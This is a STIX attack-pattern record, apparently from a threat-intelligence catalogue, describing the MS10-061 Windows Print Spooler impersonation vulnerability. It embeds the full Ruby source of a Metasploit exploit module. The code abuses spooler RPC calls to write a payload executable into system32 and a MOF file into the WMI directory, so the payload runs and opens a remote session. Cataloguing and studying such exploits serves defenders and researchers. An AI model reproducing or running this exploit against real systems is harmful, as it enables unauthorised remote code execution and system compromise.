{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--110f7a57-d8db-4e99-94ef-cc71bba6ce80",
    "created": "2024-08-14T16:56:28.13731Z",
    "modified": "2024-08-14T16:56:28.137314Z",
    "name": "MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability",
    "description": " This module exploits the RPC service impersonation vulnerability detailed in Microsoft Bulletin MS10-061. By making a specific DCE RPC request to the StartDocPrinter procedure, an attacker can impersonate the Printer Spooler service to create a file. The working directory at the time is %SystemRoot%\\\\system32. An attacker can specify any file name, including directory traversal or full paths. By sending WritePrinter requests, an attacker can fully control the content of the created file.  In order to gain code execution, this module writes to a directory used by Windows Management Instrumentation (WMI) to deploy applications. This directory (Wbem\\\\Mof) is periodically scanned and any new .mof files are processed automatically. This is the same technique employed by the Stuxnet code found in the wild. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms10_061_spoolss.rb",
            "external_id": "ms10_061_spoolss.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2729"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability',\n      'Description'    => %q{\n          This module exploits the RPC service impersonation vulnerability detailed in\n        Microsoft Bulletin MS10-061. By making a specific DCE RPC request to the\n        StartDocPrinter procedure, an attacker can impersonate the Printer Spooler service\n        to create a file. The working directory at the time is %SystemRoot%\\\\system32.\n        An attacker can specify any file name, including directory traversal or full paths.\n        By sending WritePrinter requests, an attacker can fully control the content of\n        the created file.\n\n        In order to gain code execution, this module writes to a directory used by Windows\n        Management Instrumentation (WMI) to deploy applications. This directory (Wbem\\\\Mof)\n        is periodically scanned and any new .mof files are processed automatically. This is\n        the same technique employed by the Stuxnet code found in the wild.\n      },\n      'Author'         =>\n        [\n          'jduck',  # re-discovery, printer RPC stubs, module\n          'hdm'     # ATSVC RPC proxy method, etc ;)\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'References'     =>\n        [\n          [ 'OSVDB', '67988' ],\n          [ 'CVE', '2010-2729' ],\n          [ 'MSB', 'MS10-061' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\",\n          'DisableNops' => true,\n        },\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { } ]\n        ],\n      'DisclosureDate' => '2010-09-14',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ false,  \"The named pipe for the spooler service\", \"spoolss\"]),\n        OptString.new('PNAME',   [ false,  \"The printer share name to use on the target\" ]),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n\n  def exploit\n\n    connect(versions: [1])\n    login_time = Time.now\n    smb_login()\n\n    print_status(\"Trying target #{target.name}...\")\n\n    handle = dcerpc_handle('12345678-1234-abcd-EF00-0123456789ab', '1.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n\n    print_status(\"Bound to #{handle} ...\")\n\n    # Try all of the printers :)\n    printers = []\n    if (pname = datastore['PNAME'])\n      printers << pname\n    else\n      res = self.simple.client.trans(\n        \"\\\\PIPE\\\\LANMAN\",\n        (\n          [0x00].pack('v') +\n          \"WrLeh\\x00\"   +\n          \"B13BWz\\x00\"  +\n          [0x01, 65406].pack(\"vv\")\n        )\n      )\n\n      printers = []\n\n      lerror, lconv, lentries, lcount = res['Payload'].to_s[\n        res['Payload'].v['ParamOffset'],\n        res['Payload'].v['ParamCount']\n      ].unpack(\"v4\")\n\n      data = res['Payload'].to_s[\n        res['Payload'].v['DataOffset'],\n        res['Payload'].v['DataCount']\n      ]\n\n      0.upto(lentries - 1) do |i|\n        sname,tmp = data[(i * 20) +  0, 14].split(\"\\x00\")\n        stype     = data[(i * 20) + 14, 2].unpack('v')[0]\n        scoff     = data[(i * 20) + 16, 2].unpack('v')[0]\n        if ( lconv != 0)\n          scoff -= lconv\n        end\n        scomm,tmp = data[scoff, data.length - scoff].split(\"\\x00\")\n\n        # we only want printers\n        next if stype != 1\n\n        printers << sname\n      end\n    end\n\n    # Generate a payload EXE to execute\n    exe = generate_payload_exe\n\n    printers.each { |pr|\n\n      pname = \"\\\\\\\\#{rhost}\\\\#{pr}\"\n\n      print_status(\"Attempting to exploit MS10-061 via #{pname} ...\")\n\n      # Open the printer\n      status,ph = open_printer_ex(pname)\n      if status != 0\n        fail_with(Failure::Unknown, \"Unable to open printer: #{Msf::WindowsError.description(status)}\")\n      end\n      print_status(\"Printer handle: %s\" % ph.unpack('H*'))\n\n\n      # NOTE: fname can be anything nice to write to (cwd is system32), even\n      # directory traversal and full paths are OK.\n      fname = rand_text_alphanumeric(14) + \".exe\"\n      write_file_contents(ph, fname, exe)\n\n      # Generate a MOF file and write it so that the Windows Management Service will\n      # execute our binary ;)\n      mofname = rand_text_alphanumeric(14) + \".mof\"\n      mof = generate_mof(mofname, fname)\n      write_file_contents(ph, \"wbem\\\\mof\\\\#{mofname}\", mof)\n\n      # ClosePrinter\n      status,ph = close_printer(ph)\n      if status != 0\n        fail_with(Failure::Unknown, \"Failed to close printer: #{Msf::WindowsError.description(status)}\")\n      end\n\n      break if session_created?\n    }\n\n    print_status(\"Everything should be set, waiting for a session...\")\n    handler\n\n    cnt = 1\n    while session_created? == false and cnt < 25\n      ::IO.select(nil, nil, nil, 0.25)\n      cnt += 1\n    end\n\n    disconnect\n\n  rescue ::Rex::Proto::SMB::Exceptions::ErrorCode, Rex::ConnectionError\n    fail_with(Failure::Unknown, $!.message)\n  end\n\n\n  #\n  # Use the vuln to write a file :)\n  #\n  def write_file_contents(ph, fname, data)\n\n    doc = rand_text_alphanumeric(16+rand(16))\n\n    # StartDocPrinter\n    status,jobid = start_doc_printer(ph, doc, fname)\n    if status != 0 or jobid < 0\n      fail_with(Failure::Unknown, \"Unable to start print job: #{Msf::WindowsError.description(status)}\")\n    end\n    print_status(\"Job started: 0x%x\" % jobid)\n\n    # WritePrinter\n    status,wrote = write_printer(ph, data)\n    if status != 0 or wrote != data.length\n      fail_with(Failure::Unknown, ('Failed to write %d bytes!' % data.length))\n    end\n    print_status(\"Wrote %d bytes to %%SystemRoot%%\\\\system32\\\\%s\" % [data.length, fname])\n\n    # EndDocPrinter\n    status = end_doc_printer(ph)\n    if status != 0\n      fail_with(Failure::Unknown, \"Failed to end print job: #{Msf::WindowsError.description(status)}\")\n    end\n  end\n\n\n  #\n  # Call RpcOpenPrinterEx\n  #\n  def open_printer_ex(pname, machine = nil, user = nil)\n=begin\n    DWORD RpcOpenPrinterEx(\n      [in, string, unique] STRING_HANDLE pPrinterName,\n      [out] PRINTER_HANDLE* pHandle,\n      [in, string, unique] wchar_t* pDatatype,\n      [in] DEVMODE_CONTAINER* pDevModeContainer,\n      [in] DWORD AccessRequired,\n      [in] SPLCLIENT_CONTAINER* pClientInfo\n    );\n=end\n\n    # NOTE: For more information about this encoding, see the following\n    # sections of the Open Group's C706 DCE 1.1: RPC\n    #\n    # 14.3.8 Unions\n    # 14.3.10 Pointers\n    # 14.3.12.3 Algorithm for Deferral of Referents\n    #\n    machine ||= ''\n    machine = NDR.uwstring(machine)\n    user ||= ''\n    user = NDR.uwstring(user)\n\n    splclient_info =\n      NDR.long(0) +          # DWORD dwSize;\n      machine[0,4] +         # [string] wchar_t* pMachineName;\n      user[0,4] +            # [string] wchar_t* pUserName;\n      NDR.long(7600) +       # DWORD dwBuildNum\n      NDR.long(3) +          # DWORD dwMajorVersion;\n      NDR.long(0) +          # DWORD dwMinorVersion;\n      NDR.long(9)            # unsigned short wProcessorArchitecture;\n\n    # Add the deferred members\n    splclient_info << machine[4, machine.length]\n    splclient_info << user[4, user.length]\n\n    splclient_info[0,4] = NDR.long(splclient_info.length)\n\n    splclient_info =\n      # union!\n      NDR.long(1) +        # discriminant (inside copy)\n      NDR.long(rand(0xffffffff)) +\n      splclient_info\n\n    stubdata =\n      NDR.uwstring(pname) +  # pPrinterName\n      NDR.long(0) +\n      # DEVMODE_CONTAINER (null)\n      NDR.long(0) +\n      NDR.long(0) +\n      # AccessRequired\n      NDR.long(0x02020000) +\n      # SPLCLIENT_CONTAINER\n      NDR.long(1) + # Level (must be 1)\n      # SPLCLIENT_INFO_1\n      splclient_info\n\n    #print_status('Sending OpenPrinterEx request...')\n    response = dcerpc.call(69, stubdata)\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      #print_status(\"\\n\" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\n\n      handle = dcerpc.last_response.stub_data[0,20]\n      status = dcerpc.last_response.stub_data[20,4].unpack('V').first\n\n      return [status, handle]\n    end\n\n    nil\n  end\n\n\n  #\n  # Call RpcStartDocPrinter\n  #\n  def start_doc_printer(handle, dname, fname, dtype = nil)\n=begin\n    typedef struct _DOC_INFO_CONTAINER {\n      DWORD Level;\n      [switch_is(Level)] union {\n        [case(1)]\n        DOC_INFO_1* pDocInfo1;\n      } DocInfo;\n    } DOC_INFO_CONTAINER;\n    DWORD RpcStartDocPrinter(\n      [in] PRINTER_HANDLE hPrinter,\n      [in] DOC_INFO_CONTAINER* pDocInfoContainer,\n      [out] DWORD* pJobId\n    );\n=end\n    dname = NDR.uwstring(dname)\n    if fname\n      fname = NDR.uwstring(fname)\n    else\n      fname = NDR.long(0)\n    end\n    if dtype\n      dtype = NDR.uwstring(dtype)\n    else\n      dtype = NDR.long(0)\n    end\n\n    doc_info =\n      dname[0, 4] +\n      fname[0, 4] +\n      dtype[0, 4]\n\n    # Add the deferred members\n    doc_info << dname[4, dname.length]\n    doc_info << fname[4, fname.length]\n    doc_info << dtype[4, dtype.length]\n\n    doc_info =\n      # Union!\n      NDR.long(1) +\n      NDR.long(rand(0xffffffff)) +\n      doc_info\n\n    stubdata =\n      handle +\n      NDR.long(1) +\n      doc_info\n\n    #print_status('Sending StartDocPrinter request...')\n    response = dcerpc.call(17, stubdata)\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      #print_status(\"\\n\" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\n      jobid, status = dcerpc.last_response.stub_data.unpack('VV')\n      return [status, jobid]\n    end\n\n    nil\n  end\n\n\n  #\n  # Call RpcWritePrinter\n  #\n  def write_printer(handle, data)\n=begin\n    DWORD RpcWritePrinter(\n      [in] PRINTER_HANDLE hPrinter,\n      [in, size_is(cbBuf)] BYTE* pBuf,\n      [in] DWORD cbBuf,\n      [out] DWORD* pcWritten\n    );\n=end\n    stubdata =\n      handle +\n      NDR.long(data.length) +\n      # Perhaps we need a better data type for BYTE* :)\n      data +\n      NDR.align(data) +\n      NDR.long(data.length)\n\n    #print_status('Sending WritePrinter request...')\n    response = dcerpc.call(19, stubdata)\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      #print_status(\"\\n\" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\n      wrote,status = dcerpc.last_response.stub_data.unpack('VV')\n      return [status, wrote]\n    end\n\n    nil\n  end\n\n\n  #\n  # Call RpcEndDocPrinter\n  #\n  def end_doc_printer(handle)\n=begin\n    DWORD RpcEndDocPrinter(\n      [in] PRINTER_HANDLE* phPrinter\n    );\n=end\n\n    #print_status('Sending EndDocPrinter request...')\n    response = dcerpc.call(23, handle)\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      #print_status(\"\\n\" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\n      status = dcerpc.last_response.stub_data[0,4].unpack('V').first\n      return status\n    end\n\n    nil\n  end\n\n\n  #\n  # Call RpcClosePrinter\n  #\n  def close_printer(handle)\n=begin\n    DWORD RpcClosePrinter(\n      [in, out] PRINTER_HANDLE* phPrinter\n    );\n=end\n\n    #print_status('Sending ClosePrinter request...')\n    response = dcerpc.call(29, handle)\n    if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      #print_status(\"\\n\" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\n      handle = dcerpc.last_response.stub_data[0,20]\n      status = dcerpc.last_response.stub_data[20,4].unpack('V').first\n      return [status,handle]\n    end\n\n    nil\n  end\n\n\n  def seconds_since_midnight(time)\n    # .tv_sec always uses .utc\n    (time.tv_sec % 86400)\n\n    # This method uses the localtime\n    #(time.hour * 3600) + (time.min * 60) + (time.sec)\n  end\n\n  # We have to wait a bit longer since the WMI service is a bit slow..\n  def wfs_delay\n    10\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-14",
    "x_mitre_platforms": [
        "win'"
    ]
}